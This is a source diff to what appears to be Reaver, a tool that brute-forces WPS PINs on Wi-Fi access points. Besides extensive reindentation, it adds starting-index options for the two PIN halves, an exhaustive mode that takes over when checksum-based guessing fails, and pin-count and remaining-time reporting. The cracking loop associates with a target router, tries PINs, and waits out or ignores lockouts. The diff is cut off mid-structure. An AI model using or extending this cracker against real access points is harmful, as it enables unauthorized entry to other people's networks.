@@ -1,0 +1,1439 @@
+diff -rupN trunk/src/argsparser.c trunk_modif/src/argsparser.c
+--- trunk/src/argsparser.c	2013-06-29 13:30:46.263635614 +0200
++++ trunk_modif/src/argsparser.c	2013-06-29 13:37:26.190607850 +0200
+@@ -41,7 +41,7 @@ int process_arguments(int argc, char **a
+ 	int long_opt_index = 0;
+ 	char bssid[MAC_ADDR_LEN] = { 0 };
+ 	char mac[MAC_ADDR_LEN] = { 0 };
+-	char *short_options = "b:e:m:i:t:d:c:T:x:r:g:l:o:p:s:C:aA5ELfnqvDShwN";
++	char *short_options = "b:e:m:i:t:d:c:T:x:r:g:l:o:p:s:C:1:2:aA5ELfnqvDShwXN";
+ 	struct option long_options[] = {
+ 		{ "interface", required_argument, NULL, 'i' },
+ 		{ "bssid", required_argument, NULL, 'b' },
+@@ -59,6 +59,8 @@ int process_arguments(int argc, char **a
+ 		{ "out-file", required_argument, NULL, 'o' },
+ 		{ "pin", required_argument, NULL, 'p' },
+ 		{ "exec", required_argument, NULL, 'C' },
++		{ "p1-index", required_argument, NULL, '1' },
++		{ "p2-index", required_argument, NULL, '2' },
+ 		{ "no-associate", no_argument, NULL, 'A' },
+ 		{ "ignore-locks", no_argument, NULL, 'L' },
+ 		{ "no-nacks", no_argument, NULL, 'N' },
+@@ -72,6 +74,7 @@ int process_arguments(int argc, char **a
+ 		{ "quiet", no_argument, NULL, 'q' },
+ 		{ "verbose", no_argument, NULL, 'v' },
+ 		{ "win7", no_argument, NULL, 'w' },
++		{ "exhaustive", no_argument, NULL, 'X' },
+ 		{ "help", no_argument, NULL, 'h' },
+ 		{ 0, 0, 0, 0 }
+ 	};
+@@ -80,42 +83,42 @@ int process_arguments(int argc, char **a
+ 	optind = 0;
+ 
+ 	while((c = getopt_long(argc, argv, short_options, long_options, &long_opt_index)) != -1)
+-        {
+-                switch(c)
+-                {
+-                        case 'i':
+-                                set_iface(optarg);
+-                                break;
+-                        case 'b':
+-                                str2mac((unsigned char *) optarg, (unsigned char *) &bssid);
+-                                set_bssid((unsigned char *) &bssid);
+-                                break;
+-                        case 'e':
+-                                set_ssid(optarg);
+-                                break;
+-                        case 'm':
+-                                str2mac((unsigned char *) optarg, (unsigned char *) &mac);
+-                                set_mac((unsigned char *) &mac);
+-                                break;
+-                        case 't':
+-                                set_rx_timeout(atoi(optarg));
+-                                break;
+-                        case 'T':
+-                                set_m57_timeout(strtof(optarg, NULL) * SEC_TO_US);
+-                                break;
+-                        case 'c':
++	{
++		switch(c)
++		{
++			case 'i':
++				set_iface(optarg);
++				break;
++			case 'b':
++				str2mac((unsigned char *) optarg, (unsigned char *) &bssid);
++				set_bssid((unsigned char *) &bssid);
++				break;
++			case 'e':
++				set_ssid(optarg);
++				break;
++			case 'm':
++				str2mac((unsigned char *) optarg, (unsigned char *) &mac);
++				set_mac((unsigned char *) &mac);
++				break;
++			case 't':
++				set_rx_timeout(atoi(optarg));
++				break;
++			case 'T':
++				set_m57_timeout(strtof(optarg, NULL) * SEC_TO_US);
++				break;
++			case 'c':
+ 				channel = strtod(optarg, NULL);
+-                                set_fixed_channel(1);
+-                                break;
+-                        case '5':
+-                                set_wifi_band(AN_BAND);
+-                                break;
+-                        case 'd':
+-                                set_delay(atoi(optarg));
+-                                break;
+-                        case 'l':
+-                                set_lock_delay(atoi(optarg));
+-                                break;
++				set_fixed_channel(1);
++				break;
++			case '5':
++				set_wifi_band(AN_BAND);
++				break;
++			case 'd':
++				set_delay(atoi(optarg));
++				break;
++			case 'l':
++				set_lock_delay(atoi(optarg));
++				break;
+ 			case 'p':
+ 				parse_static_pin(optarg);
+ 				break;
+@@ -125,58 +128,67 @@ int process_arguments(int argc, char **a
+ 			case 'C':
+ 				set_exec_string(optarg);
+ 				break;
++			case '1':
++				set_p1_index(atoi(optarg));
++				break;
++			case '2':
++				set_p2_index(atoi(optarg));
++				break;
+ 			case 'A':
+ 				set_external_association(1);
+ 				break;
+-                        case 'L':
+-                                set_ignore_locks(1);
+-                                break;
++			case 'L':
++				set_ignore_locks(1);
++				break;
+ 			case 'a':       
+ 				set_auto_detect_options(1); 
+ 				break;
+ 			case 'o':
+ 				set_log_file(fopen(optarg, "w"));
+ 				break;
+-                        case 'x':
+-                                set_fail_delay(atoi(optarg));
+-                                break;
+-                        case 'r':
+-                                parse_recurring_delay(optarg);
+-                                break;
+-                        case 'g':
+-                                set_max_pin_attempts(atoi(optarg));
+-                                break;
+-                        case 'D':
++			case 'x':
++				set_fail_delay(atoi(optarg));
++				break;
++			case 'r':
++				parse_recurring_delay(optarg);
++				break;
++			case 'g':
++				set_max_pin_attempts(atoi(optarg));
++				break;
++			case 'D':
+ 				daemonize();
+ 				break;
+ 			case 'E':
+-                                set_eap_terminate(1);
+-                                break;
++				set_eap_terminate(1);
++				break;
+ 			case 'S':
+ 				set_dh_small(1);
+ 				break;
+-                        case 'n':
+-                                set_timeout_is_nack(0);
+-                                break;
+-                        case 'f':
+-                                set_fixed_channel(1);
+-                                break;
+-                        case 'v':
+-                                set_debug(get_debug() + 1);
+-                                break;
+-                        case 'q':
+-                                set_debug(CRITICAL);
+-                                break;
++			case 'n':
++				set_timeout_is_nack(0);
++				break;
++			case 'f':
++				set_fixed_channel(1);
++				break;
++			case 'v':
++				set_debug(get_debug() + 1);
++				break;
++			case 'q':
++				set_debug(CRITICAL);
++				break;
+ 			case 'w':
+ 				set_win7_compat(1);
+ 				break;
++			case 'X':
++				set_exhaustive(1);
++				break;
+ 			case 'N':
+ 				set_oo_send_nack(0);
+ 				break;
+-                        default:
+-                                ret_val = EXIT_FAILURE;
+-                }
+-        }
++			default:
++				ret_val = EXIT_FAILURE;
++		}
++	}
+ 
+ 	if(channel)
+ 	{
+@@ -191,33 +203,36 @@ void init_default_settings(void)
+ {
+ 	set_log_file(stdout);
+ 	set_max_pin_attempts(P1_SIZE + P2_SIZE);
+-        set_delay(DEFAULT_DELAY);
+-        set_lock_delay(DEFAULT_LOCK_DELAY);
+-        set_debug(INFO);
+-        set_auto_channel_select(1);
+-        set_timeout_is_nack(1);
++	set_delay(DEFAULT_DELAY);
++	set_lock_delay(DEFAULT_LOCK_DELAY);
++	set_key_status(KEY1_WIP);
++	set_debug(INFO);
++	set_auto_channel_select(1);
++	set_timeout_is_nack(1);
+ 	set_oo_send_nack(1);
+-        set_wifi_band(BG_BAND);
++	set_wifi_band(BG_BAND);
++	set_p1_index(0);
++	set_p2_index(0);
+ }
+ 
+ /* Parses the recurring delay optarg */
+ void parse_recurring_delay(char *arg)
+ {
+-        char *x = NULL, *y = NULL;
++	char *x = NULL, *y = NULL;
+ 
+-        x = strdup(arg);
+-        y = strchr(x, ':');
++	x = strdup(arg);
++	y = strchr(x, ':');
+ 
+-        if(y)
+-        {
+-                memset(y, 0, 1);
+-                y++;
++	if(y)
++	{
++		memset(y, 0, 1);
++		y++;
+ 
+-                set_recurring_delay_count(atoi(x));
+-                set_recurring_delay(atoi(y));
+-        }
++		set_recurring_delay_count(atoi(x));
++		set_recurring_delay(atoi(y));
++	}
+ 
+-        free(x);
++	free(x);
+ }
+ 
+ /* Parse the WPS pin to use into p1 and p2 */
+diff -rupN trunk/src/cracker.c trunk_modif/src/cracker.c
+--- trunk/src/cracker.c	2013-06-29 13:30:46.263635614 +0200
++++ trunk_modif/src/cracker.c	2013-06-29 13:37:26.194607800 +0200
+@@ -33,13 +33,15 @@
+ 
+ #include "cracker.h"
+ 
++time_t last_display = 0;
++int last_attempts = 0;
++
+ /* Brute force all possible WPS pins for a given access point */
+ void crack()
+ {
+ 	unsigned char *bssid = NULL;
+ 	char *pin = NULL;
+ 	int fail_count = 0, loop_count = 0, sleep_count = 0, assoc_fail_count = 0;
+-	float pin_count = 0;
+ 	time_t start_time = 0;
+ 	enum wps_result result = 0;
+ 
+@@ -77,7 +79,7 @@ void crack()
+ 		cprintf(INFO, "[+] Waiting for beacon from %s\n", bssid);
+ 		read_ap_beacon();
+ 		process_auto_options();
+-	
++
+ 		/* I'm fairly certian there's a reason I put this in twice. Can't remember what it was now though... */	
+ 		if(get_max_pin_attempts() == -1)
+ 		{
+@@ -86,19 +88,19 @@ void crack()
+ 		}
+ 
+ 		/* This initial association is just to make sure we can successfully associate */
+-                while(!reassociate())
+-                {
++		while(!reassociate())
++		{
+ 			if(assoc_fail_count == MAX_ASSOC_FAILURES)
+ 			{
+ 				assoc_fail_count = 0;
+-	                	cprintf(CRITICAL, "[!] WARNING: Failed to associate with %s (ESSID: %s)\n", bssid, get_ssid());
++				cprintf(CRITICAL, "[!] WARNING: Failed to associate with %s (ESSID: %s)\n", bssid, get_ssid());
+ 			}
+ 			else
+ 			{
+ 				assoc_fail_count++;
+ 			}
+-                }
+-                cprintf(INFO, "[+] Associated with %s (ESSID: %s)\n", bssid, get_ssid());
++		}
++		cprintf(INFO, "[+] Associated with %s (ESSID: %s)\n", bssid, get_ssid());
+ 
+ 		/* Used to calculate pin attempt rates */
+ 		start_time = time(NULL);
+@@ -117,6 +119,8 @@ void crack()
+ 			set_key_status(KEY2_WIP);
+ 		}
+ 
++		cprintf(INFO, "[+] Starting Cracking Session. Pin count: %i, Max pin attempts: %i\n", get_pin_count(), get_max_pin_attempts());
++
+ 		/* Main cracking loop */
+ 		for(loop_count=0, sleep_count=0; get_key_status() != KEY_DONE; loop_count++, sleep_count++)
+ 		{
+@@ -139,11 +143,11 @@ void crack()
+ 			 * Verify that the AP is not locked before attempting the next pin.
+ 			 */
+ 			while(get_ignore_locks() == 0 && is_wps_locked())
+-                        {
+-                                cprintf(WARNING, "[!] WARNING: Detected AP rate limiting, waiting %d seconds before re-checking\n", get_lock_delay());
++			{
++				cprintf(WARNING, "[!] WARNING: Detected AP rate limiting, waiting %d seconds before re-checking\n", get_lock_delay());
+ 				pcap_sleep(get_lock_delay());
+-				
+-                        }
++
++			}
+ 
+ 			/* Initialize wps structure */
+ 			set_wps(initialize_wps_data());
+@@ -162,7 +166,7 @@ void crack()
+ 			}
+ 			else
+ 			{
+-				cprintf(WARNING, "[+] Trying pin %s\n", pin);
++				cprintf(WARNING, "[+] Trying pin %s.\n", pin);
+ 			}
+ 
+ 			/* 
+@@ -171,7 +175,7 @@ void crack()
+ 			 */
+ 			assoc_fail_count = 0;
+ 			while(!reassociate())
+-                	{
++			{
+ 				if(assoc_fail_count == MAX_ASSOC_FAILURES)
+ 				{
+ 					assoc_fail_count = 0;
+@@ -181,8 +185,8 @@ void crack()
+ 				{
+ 					assoc_fail_count++;
+ 				}
+-                	}
+-			
++			}
++
+ 
+ 			/* 
+ 			 * Enter receive loop. This will block until a receive timeout occurs or a
+@@ -199,15 +203,15 @@ void crack()
+ 				 */
+ 				case KEY_REJECTED:
+ 					fail_count = 0;
+-					pin_count++;
+ 					advance_pin_count();
++					cprintf(WARNING, "[+] Pin count advanced: %i. Max pin attempts: %i\n", get_pin_count(), get_max_pin_attempts());
+ 					break;
+-				/* Got it!! */
++					/* Got it!! */
+ 				case KEY_ACCEPTED:
+ 					break;
+-				/* Unexpected timeout or EAP failure...try this pin again */
++					/* Unexpected timeout or EAP failure...try this pin again */
+ 				default:
+-					cprintf(VERBOSE, "[!] WPS transaction failed (code: 0x%.2X), re-trying last pin\n", result);
++					cprintf(WARNING, "[!] WPS transaction failed (code: 0x%.2X), re-trying last pin\n", result);
+ 					fail_count++;
+ 					break;
+ 			}
+@@ -224,7 +228,7 @@ void crack()
+ 			if(loop_count == DISPLAY_PIN_COUNT)
+ 			{
+ 				save_session();
+-				display_status(pin_count, start_time);
++				display_status(start_time);
+ 				loop_count = 0;
+ 			}
+ 
+@@ -248,14 +252,22 @@ void crack()
+ 
+ 			/* If we've hit our max number of pin attempts, quit */
+ 			if((get_max_pin_attempts() > 0) && 
+-			   (pin_count == get_max_pin_attempts()))
++					(get_pin_count() == get_max_pin_attempts()))
+ 			{
+-				cprintf(VERBOSE, "[+] Quitting after %d crack attempts\n", get_max_pin_attempts());
+-				break;
++				if(get_exhaustive()){
++					cprintf(WARNING, "[+] Quitting after %d crack attempts\n", get_max_pin_attempts());
++					break;
++				}
++				else
++				{
++					cprintf(WARNING, "[+] Checksum mode was not successful. Starting exhaustive attack\n");
++					set_exhaustive(1);
++					set_p2_index(0);
++				}
+ 			}
+ 		}
+ 
+-                if(bssid) free(bssid);
++		if(bssid) free(bssid);
+ 		if(get_handle())
+ 		{
+ 			pcap_close(get_handle());
+@@ -285,14 +297,27 @@ void advance_pin_count()
+ 	}
+ }
+ 
++int get_pin_count()
++{
++	int pin_count = 0;
++	if(get_key_status() == KEY1_WIP)
++	{
++		pin_count = get_p1_index() + get_p2_index();
++	} 
++	else if(get_key_status() == KEY2_WIP)
++	{
++		pin_count = P1_SIZE + get_p2_index();
++	}
++	return pin_count;
++}
++
+ /* Displays the status and rate of cracking */
+-void display_status(float pin_count, time_t start_time)
++void display_status(time_t start_time)
+ {
+ 	float percentage = 0;
+-	int attempts = 0, average = 0;
+-	time_t now = 0, diff = 0;
+-	struct tm *tm_p = NULL;
+-        char time_s[256] = { 0 };
++	int attempts = 0;
++	time_t now = 0, diff = 0, expected = 0;
++	int days = 0, hours = 0, minutes = 0, seconds = 0;
+ 
+ 	if(get_key_status() == KEY1_WIP)
+ 	{
+@@ -308,34 +333,42 @@ void display_status(float pin_count, tim
+ 	}
+ 	else if(get_key_status() == KEY_DONE)
+ 	{
+-		attempts = P1_SIZE + P2_SIZE;
++		attempts = get_max_pin_attempts();
+ 	}
+ 
+-	percentage = (float) (((float) attempts / (P1_SIZE + P2_SIZE)) * 100);
+-	
++	percentage = (float) (((float) attempts / (get_max_pin_attempts())) * 100);
++
+ 	now = time(NULL);
+-	diff = now - start_time;
++	diff = (int) (now - start_time);
+ 
+-        tm_p = localtime(&now);
+-	if(tm_p)
+-	{
+-        	strftime(time_s, sizeof(time_s), TIME_FORMAT, tm_p);
+-	}
+-	else
++	if(diff > 0)
+ 	{
+-		perror("localtime");
++		seconds = diff % 60;
++		int t_minutes = diff / 60;
++		minutes = t_minutes % 60;
++		int t_hours = t_minutes / 60;
++		hours = t_hours % 24;
++		days = t_hours / 24;
+ 	}
+ 
+-	if(pin_count > 0)
+-	{
+-		average =  (int) (diff / pin_count);
+-	}
+-	else
++	
++	cprintf(INFO, "[+] %.2f%% complete. Elapsed time: %id%ih%im%is.\n", percentage, days, hours, minutes, seconds);
++	if(last_display)
+ 	{
+-		average = 0;
++		expected = ((now - last_display)/(attempts-last_attempts))*(get_max_pin_attempts()-attempts);
++		if(expected > 0)
++		{
++			seconds = expected % 60;
++			int t_minutes = expected / 60;
++			minutes = t_minutes % 60;
++			int t_hours = t_minutes / 60;
++			hours = t_hours % 24;
++			days = t_hours / 24;
++		}
++		cprintf(INFO, "[+] Estimated Remaining time: %id%ih%im%is\n", days, hours, minutes, seconds);
+ 	}
+-
+-	cprintf(INFO, "[+] %.2f%% complete @ %s (%d seconds/pin)\n", percentage, time_s, average);
++	last_display = now;
++	last_attempts = attempts;
+ 
+ 	return;
+ }
+diff -rupN trunk/src/cracker.h trunk_modif/src/cracker.h
+--- trunk/src/cracker.h	2013-06-29 13:30:46.267635564 +0200
++++ trunk_modif/src/cracker.h	2013-06-29 13:37:26.194607800 +0200
+@@ -44,10 +44,12 @@
+ #include "argsparser.h"
+ 
+ #define DISPLAY_PIN_COUNT	5
+-#define TIME_FORMAT		"%F %T"
++#define DATE_TIME_FORMAT	"%F %T"
++#define TIME_FORMAT			"%T"
+ 
+ void crack();
+ void advance_pin_count();
+-void display_status(float pin_count, time_t start_time);
++int get_pin_count();
++void display_status(time_t start_time);
+ 
+ #endif
+diff -rupN trunk/src/exchange.c trunk_modif/src/exchange.c
+--- trunk/src/exchange.c	2013-06-29 13:30:46.259635664 +0200
++++ trunk_modif/src/exchange.c	2013-06-29 13:37:26.198607750 +0200
+@@ -60,9 +60,9 @@ enum wps_result do_wps_exchange()
+ 	 *	o We hit an unrecoverable receive timeout
+ 	 */
+ 	while((get_key_status() != KEY_DONE) && 
+-	      !terminated &&
+-	      !got_nack && 
+-              !premature_timeout)
++			!terminated &&
++			!got_nack && 
++			!premature_timeout)
+ 	{
+ 		tx_type = 0;
+ 
+@@ -79,7 +79,7 @@ enum wps_result do_wps_exchange()
+ 
+ 		packet_type = process_packet(packet, &header);
+ 		memset((void *) packet, 0, header.len);
+-	
++
+ 		switch(packet_type)
+ 		{
+ 			case IDENTITY_REQUEST:
+@@ -113,15 +113,15 @@ enum wps_result do_wps_exchange()
+ 					terminated = 1;
+ 				}
+ 				break;
+-                        case M5:
++			case M5:
+ 				cprintf(VERBOSE, "[+] Received M5 message\n");
+-                                if(get_key_status() == KEY1_WIP)
++				if(get_key_status() == KEY1_WIP)
+ 				{
+ 					set_key_status(KEY2_WIP);
+ 				}
+ 				if(m4_sent && !m6_sent)
+ 				{
+-                                	tx_type = SEND_M6;
++					tx_type = SEND_M6;
+ 					m6_sent = 1;
+ 				}
+ 				else if(get_oo_send_nack())
+@@ -129,7 +129,7 @@ enum wps_result do_wps_exchange()
+ 					tx_type = SEND_WSC_NACK;
+ 					terminated = 1;
+ 				}
+-                                break;
++				break;
+ 			case M7:
+ 				cprintf(VERBOSE, "[+] Received M7 message\n");
+ 				/* Fall through */
+@@ -218,7 +218,7 @@ enum wps_result do_wps_exchange()
+ 		{
+ 			/* The AP is properly sending WSC_NACKs, so don't treat future timeouts as pin failures. */
+ 			set_timeout_is_nack(0);
+-			
++
+ 			ret_val = KEY_REJECTED;
+ 		}
+ 		else
+@@ -235,7 +235,7 @@ enum wps_result do_wps_exchange()
+ 		 * Only treat the timeout as a NACK if this feature is enabled.
+ 		 */
+ 		if(get_timeout_is_nack() &&
+-		  (last_msg == M3 || last_msg == M5))
++				(last_msg == M3 || last_msg == M5))
+ 		{
+ 			ret_val = KEY_REJECTED;
+ 		}
+@@ -262,18 +262,18 @@ enum wps_result do_wps_exchange()
+ 	 * Always completely terminate the WPS session, else some WPS state machines may
+ 	 * get stuck in their current state and won't accept new WPS registrar requests
+ 	 * until rebooted.
+- 	 *
++	 *
+ 	 * Stop the receive timer that is started by the termination transmission.
+ 	 */
+ 	send_wsc_nack();
+ 	stop_timer();
+-	
++
+ 	if(get_eap_terminate() || ret_val == EAP_FAIL)
+ 	{
+ 		send_termination();
+ 		stop_timer();
+ 	}
+-	
++
+ 	return ret_val;
+ }
+ 
+@@ -313,36 +313,37 @@ enum wps_type process_packet(const u_cha
+ 	{
+ 		/* Is this a data packet sent to our MAC address? */
+ 		if(frame_header->fc.type == DATA_FRAME && 
+-			frame_header->fc.sub_type == SUBTYPE_DATA && 
+-			(memcmp(frame_header->addr1, get_mac(), MAC_ADDR_LEN) == 0)) 
++				frame_header->fc.sub_type == SUBTYPE_DATA && 
++				(memcmp(frame_header->addr1, get_mac(), MAC_ADDR_LEN) == 0)) 
+ 		{
+ 			llc = (struct llc_header *) (packet +
+-							rt_header->len +
+-							sizeof(struct dot11_frame_header)
+-			);
++					rt_header->len +
++					sizeof(struct dot11_frame_header)
++					);
+ 
+ 			/* All packets in our exchanges will be 802.1x */
+ 			if(llc->type == DOT1X_AUTHENTICATION)
+ 			{
+ 				dot1x = (struct dot1X_header *) (packet +
+-								rt_header->len +
+-								sizeof(struct dot11_frame_header) +
+-								sizeof(struct llc_header)
+-				);
++						rt_header->len +
++						sizeof(struct dot11_frame_header) +
++						sizeof(struct llc_header)
++						);
+ 
+ 				/* All packets in our exchanges will be EAP packets */
+ 				if(dot1x->type == DOT1X_EAP_PACKET && (header->len >= EAP_PACKET_SIZE))
+ 				{
+ 					eap = (struct eap_header *) (packet +
+-									rt_header->len +
+-									sizeof(struct dot11_frame_header) +
+-									sizeof(struct llc_header) +
+-									sizeof(struct dot1X_header)
+-					);
++							rt_header->len +
++							sizeof(struct dot11_frame_header) +
++							sizeof(struct llc_header) +
++							sizeof(struct dot1X_header)
++							);
+ 
+ 					/* EAP session termination. Break and move on. */
+ 					if(eap->code == EAP_FAILURE)
+ 					{
++						cprintf(VERBOSE, "[!] EAP_FAILURE: TERMINATE\n");
+ 						type = TERMINATE;
+ 					} 
+ 					/* If we've received an EAP request and then this should be a WPS message */
+@@ -366,28 +367,28 @@ enum wps_type process_packet(const u_cha
+ 						else if((eap->type == EAP_EXPANDED) && (header->len > WFA_PACKET_SIZE))
+ 						{
+ 							wfa = (struct wfa_expanded_header *) (packet +
+-											rt_header->len +
+-											sizeof(struct dot11_frame_header) +
+-											sizeof(struct llc_header) +
+-											sizeof(struct dot1X_header) +
+-											sizeof(struct eap_header)
+-							);
+-						
++									rt_header->len +
++									sizeof(struct dot11_frame_header) +
++									sizeof(struct llc_header) +
++									sizeof(struct dot1X_header) +
++									sizeof(struct eap_header)
++									);
++
+ 							/* Verify that this is a WPS message */
+ 							if(wfa->type == SIMPLE_CONFIG)
+ 							{
+ 								wps_msg_len = 	(size_t) ntohs(eap->len) - 
+-										sizeof(struct eap_header) - 
+-										sizeof(struct wfa_expanded_header);
++									sizeof(struct eap_header) - 
++									sizeof(struct wfa_expanded_header);
+ 
+ 								wps_msg = (const void *) (packet +
+-											rt_header->len +
+-                                                                       	                sizeof(struct dot11_frame_header) +
+-                                                                               	        sizeof(struct llc_header) +
+-                                                                                       	sizeof(struct dot1X_header) +
+-                                                       	             	                sizeof(struct eap_header) +
+-											sizeof(struct wfa_expanded_header)
+-								);
++										rt_header->len +
++										sizeof(struct dot11_frame_header) +
++										sizeof(struct llc_header) +
++										sizeof(struct dot1X_header) +
++										sizeof(struct eap_header) +
++										sizeof(struct wfa_expanded_header)
++										);
+ 
+ 								/* Save the current WPS state. This way if we get a NACK message, we can 
+ 								 * determine what state we were in when the NACK arrived.
+@@ -416,8 +417,8 @@ enum wps_type process_wps_message(const
+ 	enum wps_type type = UNKNOWN;
+ 	struct wps_data *wps = get_wps();
+ 	unsigned char *element_data = NULL;
+-        struct wfa_element_header element = { 0 };
+-        int i = 0, header_size = sizeof(struct wfa_element_header);
++	struct wfa_element_header element = { 0 };
++	int i = 0, header_size = sizeof(struct wfa_element_header);
+ 
+ 	/* Shove data into a wpabuf structure for processing */
+ 	msg = wpabuf_alloc_copy(data, data_size);
+@@ -426,37 +427,37 @@ enum wps_type process_wps_message(const
+ 		/* Process the incoming message */
+ 		wps_registrar_process_msg(wps, get_opcode(), msg);
+ 		wpabuf_free((struct wpabuf *) msg);
+-	
++
+ 		/* Loop through until we hit the end of the data buffer */
+-                for(i=0; i<data_size; i+=header_size)
+-                {
+-                        element_data = NULL;
+-                        memset((void *) &element, 0, header_size);
+-
+-                        /* Get the element header data */
+-                        memcpy((void *) &element, (data + i), header_size);
+-                        element.type = htons(element.type);
+-                        element.length = htons(element.length);
+-
+-                        /* Make sure the element length does not exceed the remaining buffer size */
+-                        if(element.length <= (data_size - i - header_size))
+-                        {
+-                                element_data = (unsigned char *) (data + i + header_size);
+-
+-                                switch(element.type)
+-                                {
+-                                        case MESSAGE_TYPE:
+-                                                type = (uint8_t) element_data[0];
+-                                                break;
+-                                        default:
+-                                                break;
+-                                }
+-                        }
+-
+-                        /* Offset must include element length(s) */
+-                        i += element.length;
+-                }
+-	
++		for(i=0; i<data_size; i+=header_size)
++		{
++			element_data = NULL;
++			memset((void *) &element, 0, header_size);
++
++			/* Get the element header data */
++			memcpy((void *) &element, (data + i), header_size);
++			element.type = htons(element.type);
++			element.length = htons(element.length);
++
++			/* Make sure the element length does not exceed the remaining buffer size */
++			if(element.length <= (data_size - i - header_size))
++			{
++				element_data = (unsigned char *) (data + i + header_size);
++
++				switch(element.type)
++				{
++					case MESSAGE_TYPE:
++						type = (uint8_t) element_data[0];
++						break;
++					default:
++						break;
++				}
++			}
++
++			/* Offset must include element length(s) */
++			i += element.length;
++		}
++
+ 	}
+ 
+ 	return type;
+@@ -473,7 +474,7 @@ int parse_nack(const void *data, size_t
+ 	int ret_val = 0;
+ 
+ 	/* Shove data into a wpabuf structure for processing */
+-        msg = wpabuf_alloc_copy(data, data_size);
++	msg = wpabuf_alloc_copy(data, data_size);
+ 	if(msg)
+ 	{
+ 		if(wps_parse_msg(msg, &attr) >= 0)
+@@ -483,7 +484,7 @@ int parse_nack(const void *data, size_t
+ 				ret_val = WPA_GET_BE16(attr.config_error);
+ 			}
+ 		}
+-		
++
+ 		wpabuf_free((struct wpabuf *) msg);
+ 	}
+ 
+diff -rupN trunk/src/globule.c trunk_modif/src/globule.c
+--- trunk/src/globule.c	2013-06-29 13:30:46.267635564 +0200
++++ trunk_modif/src/globule.c	2013-06-29 13:37:26.198607750 +0200
+@@ -107,6 +107,7 @@ void set_p1_index(int index)
+ {
+ 	if(index < P1_SIZE)
+ 	{
++		cprintf(VERBOSE,"[+] p1_index set to %i\n",index);
+ 		globule->p1_index = index;
+ 	}
+ }
+@@ -117,8 +118,9 @@ int get_p1_index()
+ 
+ void set_p2_index(int index)
+ {
+-	if(index < P2_SIZE)
++	if(index <= P2_SIZE + globule->exhaustive*(P1_SIZE - P2_SIZE))
+ 	{
++		cprintf(VERBOSE,"[+] p2_index set to %i\n",index);
+ 		globule->p2_index = index;
+ 	}
+ }
+@@ -484,6 +486,20 @@ int get_win7_compat(void)
+ 	return globule->win7_compat;
+ }
+ 
++void set_exhaustive(int value)
++{
++	globule->exhaustive = value;
++	if(value == 1)
++	{
++		globule->max_pin_attempts=P1_SIZE+P1_SIZE;
++	}
++}
++
++int get_exhaustive(void)
++{
++	return globule->exhaustive;
++}
++
+ void set_dh_small(int value)
+ {
+ 	globule->dh_small = value;
+diff -rupN trunk/src/globule.h trunk_modif/src/globule.h
+--- trunk/src/globule.h	2013-06-29 13:30:46.251635764 +0200
++++ trunk_modif/src/globule.h	2013-06-29 13:37:26.202607700 +0200
+@@ -38,21 +38,21 @@
+ 
+ struct globals
+ {
+-        int last_wps_state;             /* Holds the previous WPS state as stored in wps->state */
++	int last_wps_state;             /* Holds the previous WPS state as stored in wps->state */
+ 
+-        int p1_index;                   /* Index into p1 array for building WPS pins */
++	int p1_index;                   /* Index into p1 array for building WPS pins */
+ 
+-        int p2_index;                   /* Index into p2 array for building WPS pins */
++	int p2_index;                   /* Index into p2 array for building WPS pins */
+ 
+-        char *p1[P1_SIZE];              /* Array of all possible values for the firt half of the pin */
++	char *p1[P1_SIZE];              /* Array of all possible values for the firt half of the pin */
+ 
+-        char *p2[P2_SIZE];              /* Array of all possible values for the second half of the pin */
++	char *p2[P2_SIZE];              /* Array of all possible values for the second half of the pin */
+ 
+ 	char *static_p1;		/* Static P1, as supplied by the user */
+-	
++
+ 	char *static_p2;		/* Static P2, as supplied by the user */
+ 
+-        enum key_state key_status;      /* Indicates the status of the key cracking: KEY1_WIP | KEY2_WIP | KEY_DONE */
++	enum key_state key_status;      /* Indicates the status of the key cracking: KEY1_WIP | KEY2_WIP | KEY_DONE */
+ 
+ 	int dh_small;			/* Use small DH keys to improve WPS speed */
+ 
+@@ -62,35 +62,37 @@ struct globals
+ 
+ 	int win7_compat;		/* Set to 1 to make WPS messages mimic Windows 7 settings. */
+ 
+-        int delay;                      /* Seconds to sleep in between key attempts */
++	int exhaustive;		/* Set to 1 to use exhaustive pin generation instead of checksum the last digit */
++
++	int delay;                      /* Seconds to sleep in between key attempts */
+ 
+-        int fail_delay;                 /* Seconds to sleep after WARN_FAILURE_COUNT WPS exchange failures */
++	int fail_delay;                 /* Seconds to sleep after WARN_FAILURE_COUNT WPS exchange failures */
+ 
+-        int recurring_delay;            /* Sleep recurring_delay seconds for every recurring_delay_count attempts */
++	int recurring_delay;            /* Sleep recurring_delay seconds for every recurring_delay_count attempts */
+ 
+ 	int lock_delay;			/* Sleep lock_delay seconds when wpscrack detects that the AP has locked WPS pin attempts */
+ 
+ 	int ignore_locks;		/* Ignore locked state */
+ 
+-        int recurring_delay_count;	/* Enter a recurring delay after recurring_delay_count pin attempts */
++	int recurring_delay_count;	/* Enter a recurring delay after recurring_delay_count pin attempts */
+ 
+-        int eap_terminate;              /* Experimental */
++	int eap_terminate;              /* Experimental */
+ 
+-        int max_pin_attempts;           /* Maximum number of pin attempts */
++	int max_pin_attempts;           /* Maximum number of pin attempts */
+ 
+-        int rx_timeout;                 /* Receive timeout period (seconds) */
++	int rx_timeout;                 /* Receive timeout period (seconds) */
+ 
+-        int timeout_is_nack;            /* Treat M5/M7 receive timeouts as NACKs (only needed for shoddy WPS implementations) */
++	int timeout_is_nack;            /* Treat M5/M7 receive timeouts as NACKs (only needed for shoddy WPS implementations) */
+ 
+-        int m57_timeout;                /* Timeout period for receiving an M5/M7 response (uSeconds) */
++	int m57_timeout;                /* Timeout period for receiving an M5/M7 response (uSeconds) */
+ 
+-        int out_of_time;                /* Set to 1 when sigalrm sounds */
++	int out_of_time;                /* Set to 1 when sigalrm sounds */
+ 
+-        enum debug_level debug;         /* Current debug level: INFO | CRITICAL | WARNING | VERBOSE */
++	enum debug_level debug;         /* Current debug level: INFO | CRITICAL | WARNING | VERBOSE */
+ 
+-        int eapol_start_count;          /* Tracks how many times in a row we've attempted to start and EAP session */
++	int eapol_start_count;          /* Tracks how many times in a row we've attempted to start and EAP session */
+ 
+-        int fixed_channel;              /* Disables channel hopping if set */
++	int fixed_channel;              /* Disables channel hopping if set */
+ 
+ 	int auto_channel_select;	/* Diables automatic parsing and changing of the current channel number, as specified in the AP's beacon packet */
+ 
+@@ -101,18 +103,18 @@ struct globals
+ 	int channel;			/* Holds the current channel number */
+ 
+ 	int max_num_probes;		/* Maximum number of probe requests to send to an AP during survey mode */
+-	
++
+ 	int validate_fcs;		/* If 1, validate each packet's FCS. If 0, process packets even with invalid FCS. */
+ 
+-        enum wsc_op_code opcode;        /* WFA opcode, received by exchange.c and used by builder.c */
